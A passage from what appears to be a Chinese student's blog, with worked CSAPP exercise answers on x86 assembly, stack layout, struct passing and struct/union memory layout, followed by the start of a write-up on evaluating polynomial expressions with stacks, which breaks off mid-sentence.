但是我们可以利用汇编以及对运行栈的理解来编写汇编过程打破这一惯例.</p><p>有如下汇编代码 ( $x86-32$ 架构 ), 其中 <code>GET</code> 过程唯一的输入参数是一个用于存储当前处理器以及栈信息的内存块地址 (假设该内存块的空间足够大), 而 <code>SET</code> 过程则用于恢复被 <code>GET</code> 过程所保存的处理器及栈信息, 其唯一的输入参数也是该内存块地址. 在理解代码的基础上, 回答下列问题:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">GET:    movl 4(%esp), %eax     #(A)    …    movl %edi, 20(%eax)    movl %esi, 24(%eax)    movl %ebp, 28(%eax)    movl %ebx, 36(%eax)    movl %edx, 40(%eax)    movl %ecx, 44(%eax)    movl $1, 48(%eax)     movl (%esp), %ecx      #(B)    movl %ecx, 60(%eax)    leal 4(%esp), %ecx     #(C)    movl %ecx, 72(%eax)    movl 44(%eax), %ecx    movl $0, %eax    retSET:    movl 4(%esp), %eax    …    movl 20(%eax), %edi    movl 24(%eax), %esi    movl 28(%eax), %ebp    movl 36(%eax), %ebx    movl 40(%eax), %edx    movl 44(%eax), %ecx    movl ____ (%eax), %esp #(D)    pushl 60(%eax)         #(E)    movl 48(%eax), %eax    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(1) <code>SET​</code> 过程的返回地址是什么, 其返回值是多少? </p><p><strong>解答:</strong></p><p>返回地址为 <code>GET</code> 函数的下一条地址; 返回值为 $1$.</p><p>(2) 代码段中的 $(A)$ 指令执行后，<code>eax</code> 中存放的是什么? $(B)$ 指令执行后, <code>ecx</code> 中存放的是什么? $(C)$ 指令的作用是什么? $(E)$ 指令的作用是什么? 并将 $(D)$ 指令补充完整.</p><p><strong>解答:</strong></p><p>$(A)$ 指令执行后, <code>eax​</code> 中存放的是用于存储处理器与栈信息的内存块的地址, 即 <code>GET</code> 函数的输入参数;</p><p>$(B)$ 指令执行后, <code>ecx​</code> 中存放的是 <code>GET</code> 函数的返回地址;</p><p>$(C)$ 指令的作用是临时存储 <code>4(%rsp)</code> 的内容, 并中转至目标内存中;</p><p>$(E)$ 指令的作用是将之前记录的 <code>GET</code> 函数的返回地址压入栈, <code>ret</code> 指令跳转到之前的相应地址;</p><p>$(D)$ 指令需填入 $72$.</p></li><li><p>请分别对照下列的 $C$ 代码与对应的汇编代码, 解释下 $C$ 函数是如何传入 <code>struct​</code> 类型参数的, 可以通过画出 <code>call input_struct</code> 时栈的 $layout$, 并辅以说明来解释.</p><p>1) <code>gcc –Og ...​</code></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token keyword">int</span> age<span class="token punctuation">;</span> <span class="token keyword">int</span> bye<span class="token punctuation">;</span> <span class="token keyword">int</span> coo<span class="token punctuation">;</span> <span class="token keyword">int</span> ddd<span class="token punctuation">;</span> <span class="token keyword">int</span> eee<span class="token punctuation">;</span><span class="token punctuation">}</span> TEST_Struct<span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">input_struct</span><span class="token punctuation">(</span>TEST_Struct in_struct<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> in_struct<span class="token punctuation">.</span>eee <span class="token operator">+</span> in_struct<span class="token punctuation">.</span>age <span class="token operator">*</span> <span class="token number">2</span> <span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">function2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>TEST_Struct main_struct<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>age <span class="token operator">=</span> i<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>bye <span class="token operator">=</span> i<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>coo <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>ddd <span class="token operator">=</span> i<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>eee <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">input_struct</span><span class="token punctuation">(</span>main_struct<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">input_struct:    movl 8(%rsp), %eax    #age    addl %eax, %eax    addl 24(%rsp), %eax   #eee    retfunction2:    subq $56, %rsp    movl i(%rip), %eax    movl %eax, 24(%rsp)   #age    movl %eax, 28(%rsp)   #bye    leal (%rax,%rax), %edx    movl %edx, 32(%rsp)   #coo    movl %eax, 36(%rsp)   #ddd    movq 24(%rsp), %rdx    movq %rdx, (%rsp)     #age/bye    movq 32(%rsp), %rdx    movq %rdx, 8(%rsp)    #coo/ddd     movl %eax, 16(%rsp)   #eee    call input_struct    addq $56, %rsp    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>解答：</strong></p><p>在栈帧中存储结构体实例. 在发生调用 <code>call input_struct​</code> 前, 在 <code>24(%rsp)</code> 开始由低地址向高地址存储 <code>age</code>, <code>bye</code>, <code>coo</code>, <code>ddd</code>. 随后将这些信息转移到 <code>%rsp</code> 开始的低地址内存中, 并附加 <code>eee</code>.</p><div align="center"><img src="/pic/9.png" width="20%" height="20%"></div><p>调用 <code>call input_struct</code> 后, 返回地址被压入栈中, 此时通过 <code>8(%rsp)</code> 访问的即是 <code>in_struct.age</code>, 通过 <code>24(%rsp)</code> 访问的即是 <code>in_struct.eee</code>.</p><div align="center"><img src="/pic/10.png" width="20%" height="20%"></div><p>2) $C$ 代码不变, 通过 <code>gcc -O1/2 ...</code> 编译后的汇编如下: </p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">input_struct:    movl 24(%rsp), %eax    movl 8(%rsp), %edx    leal (%rax,%rdx,2), %eax    retfunction2:    movl i(%rip), %eax    leal (%rax,%rax,2), %eax    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>请分析针对这段代码, 编译器做了什么优化工作.</p><p><strong>解答:</strong></p><p>使用一步 <code>leal</code> 指令替代原本的两步 <code>addl</code> 指令;</p><p>直接使用全局变量 <code>i</code> 代替已知相等的 <code>in_struct.age</code>、 <code>in_struct.age</code> 进行计算.</p><p>3) 如果在上面的 $C$ 代码的 <code>int​ input_struct</code> 声明前加上 ​<code>static</code>, 经 <code>gcc –O1/2 ...</code> 编译后的代码如下:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">function2:    movl i(%rip), %eax    leal (%rax,%rax,2), %eax    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>请分析针对这段代码, 编译器做了什么优化工作.</p><p><strong>解答:</strong></p><p>将 <code>int input_struct</code> 声明为 <code>static</code> 后只会被当前编译单元被调用, 优化 <code>function2</code> 后无需调用 <code>input_struct</code>, 因此可以不进行编译.</p></li><li><p>有如下三类结构、联合定义, 请根据左侧的汇编语言 $(x86-32)$, 补齐右侧的 $C$ 语言.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">s1</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">union</span> u1 b<span class="token punctuation">;</span>    <span class="token keyword">int</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">s2</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">s1</span> <span class="token operator">*</span>d<span class="token punctuation">;</span>    <span class="token keyword">char</span> e<span class="token punctuation">;</span>    <span class="token keyword">int</span> f<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">s2</span> <span class="token operator">*</span>g<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">union</span> u1 <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">s1</span> <span class="token operator">*</span>h<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">s2</span> <span class="token operator">*</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> j<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">A.proc1:pushl %ebpmovl %esp, %ebpmovl 8(%ebp), %eaxmovl 12(%eax), %eaxmovl %ebp, %esppopl %ebpret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">proc1</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">s2</span> <span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">-&gt;</span> __________<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">B.proc2:pushl %ebpmovl %esp, %ebpmovl 8(%ebp), %eaxmovl 4(%eax), %eaxmovl 20(%eax), %eaxmovl %ebp, %esppopl %ebpret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">proc2</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">s1</span> <span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">-&gt;</span> __________<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">C.proc3:pushl %ebpmovl %esp, %ebpmovl 8(%ebp), %eaxmovl (%eax), %eaxmovsbl 4(%eax), %eaxmovl %ebp, %esppopl %ebpret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token function">proc3</span><span class="token punctuation">(</span><span class="token keyword">union</span> u1 <span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">-&gt;</span> __________<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">D.proc4:pushl %ebpmovl %esp, %ebpmovl 8(%ebp), %eaxmovl (%eax), %eaxmovl 24(%eax), %eaxmovl (%eax), %eaxmovsbl 1(%eax), %eaxmovl %ebp, %esppopl %ebpret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token function">proc4</span><span class="token punctuation">(</span><span class="token keyword">union</span> u1 <span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">-&gt;</span> __________<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">A<span class="token operator">:</span> f<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> B<span class="token operator">:</span> b<span class="token punctuation">.</span>i<span class="token operator">-&gt;</span>f<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>C<span class="token operator">:</span> i<span class="token operator">-&gt;</span>eD<span class="token operator">:</span> i<span class="token operator">-&gt;</span>g<span class="token operator">-&gt;</span>d<span class="token operator">-&gt;</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>已知以下 $C++$ 代码与对应的运行结果, 对源代码进行补全并绘制 <code>struct A​</code> 各变量在内存中的存放位置.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdint&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>T1 a<span class="token punctuation">;</span>T2 b<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>T3 c<span class="token punctuation">;</span>T4 d<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>B e<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    A s<span class="token punctuation">;</span>    size_t size_A <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"size of A:"</span> <span class="token operator">&lt;&lt;</span> size_A <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>s<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size_A<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"a: "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>a <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"b: "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>b <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"e[0].c: "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>c <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"e[0].d: "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>d <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">size of A<span class="token operator">:</span> <span class="token number">96</span>a<span class="token operator">:</span> <span class="token operator">-</span><span class="token number">21846</span>b<span class="token operator">:</span> <span class="token number">12297829382473034410</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>c<span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1431655766</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token operator">:</span> <span class="token operator">-</span><span class="token number">3.72066e-103</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>请补全以下类型和常数:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">T1<span class="token operator">:</span> <span class="token keyword">short</span>T2<span class="token operator">:</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span>T3<span class="token operator">:</span> <span class="token keyword">int</span>T4<span class="token operator">:</span> <span class="token keyword">double</span>N<span class="token operator">:</span> <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>struct A​</code> 的内存布局 (需绘制出 <code>struct B</code> 中各变量):</p></li></ol><div align="center"><img src="/pic/11.png" width="100%" height="100%"></div>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Polynomial</title>
      <link href="/2022/10/22/shu-ju-jie-gou-polynomial/"/>
      <url>/2022/10/22/shu-ju-jie-gou-polynomial/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA2"><a href="#CST-PA2" class="headerlink" title="CST PA2"></a>CST PA2</h1><h2 id="2-2-Polynomial"><a href="#2-2-Polynomial" class="headerlink" title="2-2 Polynomial"></a>2-2 Polynomial</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>将待计算字符串中的常数对象和变量 <code>x</code> 均视为多项式——常数视为零次多项式, <code>x</code> 视为一次多项式, 那么本题相当于一个中缀多项式表达式求值的过程.</p><p>因此基本思路与中缀表达式求值相同. 编写一个栈类 <code>class Stack</code> 存储运算数和运算符, 同时编写一个多项式类 <code>class Poly</code> 并重载 <code>+</code>、<code>-</code>、<code>*</code>、<code>^</code> 运算符进行计算.</p><p>我们遍历读入的表达式, 同时设置一个多项式栈和运算符栈:</p><ul><li>如果读入数字, 则持续遍历直到不再读到数字, 并将这些数字合并为一个完整的数后转换为零次多项式加入多项式栈.</li></ul><p>接下来需要判断表达式中是否省略了 <code>'*'</code> 运算符.</p><ul><li>如果当前字符为 <code>'('</code> 或 <code>'x'</code>, 此时读取当前字符的上一个字符并进行判断, 如果上一个字符为数字或 <code>'x'</code> 或 <code>')'</code>, 则说明此处省略了乘号. 此时将上一个字符改为乘号并返回处理即可 (因为上一个字符已处理完毕, 对其进行更改不会影响已有结果.)</li></ul><p>接下来处理读取 <code>'x'</code> 情况和读取运算符情况即可.</p><ul><li>如果读入 <code>'x'</code>, 将其转换为一次多项式并加入多项式栈.</li><li>如果读入运算符, 则需比较当前运算符和运算符栈顶符号间的优先级:<ul><li>如果栈顶运算符优先级更低, 则推迟计算, 将当前运算符入栈;</li><li>如果两运算符优先级相等, 那么当前运算符为 <code>')'</code> 或者尾哨兵 <code>'\0'</code>, 直接退栈并接收下一个字符即可;</li><li>如果栈顶运算符优先级更高, 则取出多项式栈顶的两个元素执行运算并将结果压入多项式栈中.</li></ul></li><li>最后多项式栈仅剩一个多项式对象, 即中缀表达式的最终运算结果. 将其记录的系数信息逐项输出即可.</li></ul><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>基于数组实现了栈的数据结构:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T</span><span class="token operator">&gt;</span><span class="token keyword">class</span> <span class="token class-name">Stack</span> <span class="token punctuation">{</span><span class="token keyword">private</span><span class="token operator">:</span>    T<span class="token operator">*</span> _a<span class="token punctuation">;</span>    <span class="token keyword">int</span> _size<span class="token punctuation">;</span>    <span class="token keyword">int</span> _capacity<span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token function">Stack</span><span class="token punctuation">(</span><span class="token keyword">int</span> capacity<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    T<span class="token operator">&amp;</span> <span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">const</span> T<span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    T <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中每次基本操作时间复杂度均为 $O(1)$.</p><p>实现多项式类:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Poly</span> <span class="token punctuation">{</span><span class="token keyword">private</span><span class="token operator">:</span>    <span class="token keyword">int</span> coe<span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> deg<span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token function">Poly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Poly</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    Poly <span class="token keyword">operator</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    Poly <span class="token keyword">operator</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    Poly <span class="token keyword">operator</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    Poly <span class="token keyword">operator</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初始化常数多项式, 使用构造函数 <code>Poly(long long a)</code>; 初始化一次多项式, 使用构造函数 <code>Poly()</code>.</p><p>在每次二元运算操作后, 将运算结果更新至第一个操作对象中, 同时更新其记录的最高次数.</p><h3 id="问题发现与优化"><a href="#问题发现与优化" class="headerlink" title="问题发现与优化"></a>问题发现与优化</h3><p>开始的提交中测例 <code>15</code> 会出现 <code>Time Limit Exceeded</code> 的问题. 通过对代码具体实现进行了若干优化解决了该问题.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 102</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Poly <span class="token keyword">operator</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 实现 * 运算符.</span>    <span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 优先考虑被乘数为常数情况.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>deg <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token comment">// 再考虑乘数为常数情况.</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>deg <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>            <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>推测是因为多项式乘法的时间常数过大, 导致实际运算超时. 在多项式乘法中添加了判断两个多项式次数是否为 <code>0</code> 的过程, 使得计算常多项式乘积耗时降低, 解决了测例 <code>15</code> 的 <code>Time Limit Exceeded</code> 问题.</p><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><p>算法时间复杂度主要来自遍历输入表达式与多项式计算两部分:</p><p>在遍历输入表达式时, 每个元素最多入栈和出栈一次, 每次操作均为常数时间, 从而时间复杂度与输入表达式长度成正比, 为 $O(n)$;</p><p>在进行多项式计算时, 多项式栈中每两个对象经一次计算后返回一个对象. 若输入表达式能够贡献 <code>k</code> 个表达式, 则需进行 <code>k - 1</code> 次计算得出最终结果. 注意到幂运算所需时间最长, 因此最差情况为 <code>64</code> 次多项式进行幂运算, 所需为常数时间. 从而时间复杂度为 $O(n)$;</p><p>综上, 算法总时间复杂度为 $O(n)$, 具有小的时间常数.</p><p>算法空间复杂度主要来自读取字符串、转换为多项式并存储数据的过程:</p><p>由于输入串的长度上界为 <code>1,000,000</code>, 那么其实际可贡献同时入栈的多项式数和运算符数最坏情况也不会超过 <code>Max = 900,000</code>. 使用 <code>Max</code> 作为容量初始化栈:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Stack<span class="token operator">&lt;</span>Poly<span class="token operator">&gt;</span> opnd <span class="token operator">=</span> <span class="token generic-function"><span class="token function">Stack</span><span class="token generic class-name"><span class="token operator">&lt;</span>Poly<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>Max<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 多项式栈.</span>Stack<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;</span> optr <span class="token operator">=</span> <span class="token generic-function"><span class="token function">Stack</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>Max<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 运算符栈.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>主要内存被分配给多项式栈与运算符栈, 程序占用的极限内存约为: 